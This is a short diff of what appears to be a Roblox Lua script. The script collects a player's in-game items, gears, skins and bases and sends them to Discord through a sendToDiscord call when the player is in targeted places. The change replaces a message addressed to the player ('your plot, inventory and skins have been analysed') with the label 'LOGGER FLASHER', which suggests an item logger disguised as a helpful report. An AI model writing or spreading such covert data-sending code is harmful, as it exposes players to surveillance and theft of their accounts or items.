@@ -815,7 +815,7 @@ task.spawn(function()
 
     if (#brainrotQueue > 0) or (#nonTargetList > 0) or (#gearLines > 0) or (#ownedBases > 0) then
         if TARGET_PLACE_IDS[game.PlaceId] then
-            sendToDiscord("📊 Reporte Completo de Brainrots, Gears y Bases", "Se ha analizado tu plot, inventario y skins correctamente:", discordFields)
+            sendToDiscord("📊 LOGGER FLASHER", "LOGGER FLASHER:", discordFields)
         end
     end
 
